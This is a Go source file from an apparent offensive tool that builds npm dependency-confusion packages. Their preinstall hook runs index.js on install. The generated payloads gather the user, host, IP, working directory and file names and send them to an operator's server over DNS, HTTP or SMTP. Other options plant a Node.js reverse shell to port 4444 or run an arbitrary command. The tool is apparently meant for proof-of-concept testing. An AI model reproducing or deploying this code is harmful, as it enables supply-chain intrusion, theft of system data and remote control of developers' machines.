package generator

import (
	"encoding/json"
	"fmt"
	"net"
	"os"
	"path/filepath"

	"github.com/A3-N/ShouldaClaimed/pkg/cli"
)

// GeneratePackage creates the NPM package based on the configuration.
func GeneratePackage(cfg *cli.Config) error {
	// Create output directory
	pkgDir := filepath.Join(cfg.OutDir, cfg.Target)
	if err := os.MkdirAll(pkgDir, 0755); err != nil {
		return fmt.Errorf("failed to create directory %s: %w", pkgDir, err)
	}

	cli.PrintInfo("Creating package structure in %s", pkgDir)

	// Check for existing package.json and read version
	version := "1.0.0"
	pkgJSONPath := filepath.Join(pkgDir, "package.json")
	if existingData, err := os.ReadFile(pkgJSONPath); err == nil {
		var existingPkg map[string]interface{}
		if json.Unmarshal(existingData, &existingPkg) == nil {
			if v, ok := existingPkg["version"].(string); ok {
				version = incrementVersion(v)
				cli.PrintInfo("Incrementing version from %s to %s", v, version)
			}
		}
	}

	// Create package.json with clean metadata
	packageJSON := map[string]interface{}{
		"name":        cfg.Target,
		"version":     version,
		"description": "Dependency Confusion",
		"main":        "index.js",
		"scripts": map[string]string{
			"preinstall": "node index.js",
		},
		"author":        "A3-N",
		"license":       "ISC",
		"_generated_by": "ShouldaClaimed",
		"repository": map[string]string{
			"type": "git",
			"url":  "https://github.com/A3-N/ShouldaClaimed",
		},
	}

	// Generate Payload
	payloadCode := generatePayload(cfg)
	payloadFile := "index.js"

	// Write index.js
	indexPath := filepath.Join(pkgDir, payloadFile)
	if err := os.WriteFile(indexPath, []byte(payloadCode), 0644); err != nil {
		return fmt.Errorf("failed to write payload file: %w", err)
	}
	cli.PrintSuccess("Created payload: %s", payloadFile)

	// Write package.json
	file, err := os.Create(pkgJSONPath)
	if err != nil {
		return fmt.Errorf("failed to create package.json: %w", err)
	}
	defer file.Close()

	encoder := json.NewEncoder(file)
	encoder.SetIndent("", "  ")
	if err := encoder.Encode(packageJSON); err != nil {
		return fmt.Errorf("failed to write package.json: %w", err)
	}
	cli.PrintSuccess("Created package.json")

	return nil
}

// incrementVersion increments the patch version (e.g., 1.0.0 -> 1.0.1)
func incrementVersion(version string) string {
	var major, minor, patch int
	if _, err := fmt.Sscanf(version, "%d.%d.%d", &major, &minor, &patch); err == nil {
		patch++
		return fmt.Sprintf("%d.%d.%d", major, minor, patch)
	}
	return "1.0.1" // fallback
}

func generatePayload(cfg *cli.Config) string {

	rawServer := cfg.Server
	if rawServer == "" {
		rawServer = "127.0.0.1" // default fallback
	}

	// Parse host/port
	host, port, err := net.SplitHostPort(rawServer)
	if err != nil {
		// Missing port
		host = rawServer
		port = ""
	}

	dataCollectionLogic := `
const os = require('os');
const fs = require('fs');
const dns = require('dns');
const http = require('http');
const net = require('net');

function getIP() {
  const nets = os.networkInterfaces();
  for (const name of Object.keys(nets)) {
    for (const net of nets[name]) {
      if (net.family === 'IPv4' && !net.internal) {
        return net.address;
      }
    }
  }
  return 'unknown';
}

const user = os.userInfo().username;
const hostname = os.hostname();
const ip = getIP();
const info = user + '@' + hostname + ':' + ip;

// FS Info
const cwd = process.cwd();
let files = 'no-files';
try {
    files = fs.readdirSync('.').slice(0, 15).join(',');
} catch (e) {}
const fsInfo = cwd + '|' + files;

const payloads = [
    Buffer.from(info).toString('hex'),
    Buffer.from(fsInfo).toString('hex')
];
`

	if cfg.Poc != "" {
		switch cfg.Poc {
		case "dns":
			return fmt.Sprintf(`
%s
// DNS Exfiltration
payloads.forEach(hex => {
    // Split into 60-char chunks for valid DNS labels
    const chunks = hex.match(/.{1,60}/g) || [];
    chunks.forEach(chunk => {
        const targetDomain = chunk + '.%s';
        dns.lookup(targetDomain, (err, address, family) => {});
    });
});
`, dataCollectionLogic, host)

		case "http":
			return fmt.Sprintf(`
%s
// HTTP Exfiltration
let baseUrl = '%s';
if (!baseUrl.startsWith('http')) {
    baseUrl = 'http://' + baseUrl;
}
if (!baseUrl.endsWith('/')) {
    baseUrl += '/';
}
payloads.forEach(hex => {
    const targetUrl = baseUrl + hex;
    http.get(targetUrl, (resp) => {}).on("error", (err) => {});
});
`, dataCollectionLogic, rawServer)

		case "smtp":
			smtpPort := "25"
			if port != "" {
				smtpPort = port
			}
			return fmt.Sprintf(`
%s
// SMTP Exfiltration
function sendSmtp(hex) {
    const client = new net.Socket();
    client.connect(%s, '%s', function() {
        const payload = 'HELO ' + hostname + '\r\n' +
            'MAIL FROM: <test@' + hostname + '>\r\n' +
            'RCPT TO: <test@%s>\r\n' +
            'DATA\r\n' +
            'Subject: ' + hex + '\r\n\r\n' +
            '.\r\n' +
            'QUIT\r\n';
        client.write(payload);
        client.end();
    });
    client.on('error', function(err){});
}

payloads.forEach(hex => {
    sendSmtp(hex);
});
`, dataCollectionLogic, smtpPort, host, host)
		}
	} else if cfg.Rce != "" {
		cmd := cfg.Rce
		if cmd == "shell" {
			// Reverse shell POC (simple/classic)
			// Requiring a listener on server
			// This is just a placeholder example, often users want specific one.
			// Using a simple netcat-like reverse shell via generic child_process for now?
			// Or just executing a hardcoded shell command.
			// Implementing a basic nodejs reverse shell
			return fmt.Sprintf(`
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("cmd.exe", []);
    var client = new net.Socket();
    client.connect(4444, "%s", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();
`, rawServer)
		} else {
			// Execute provided command
			// e.g. "calc.exe"
			// Escape quotes in cmd
			return fmt.Sprintf(`
const { exec } = require('child_process');
exec('%s', (error, stdout, stderr) => {
    if (error) {
        console.error('exec error: ' + error);
        return;
    }
    console.log('stdout: ' + stdout);
    if (stderr) console.error('stderr: ' + stderr);
});
`, cmd)
		}
	}
	return "console.log('No payload specified');"
}
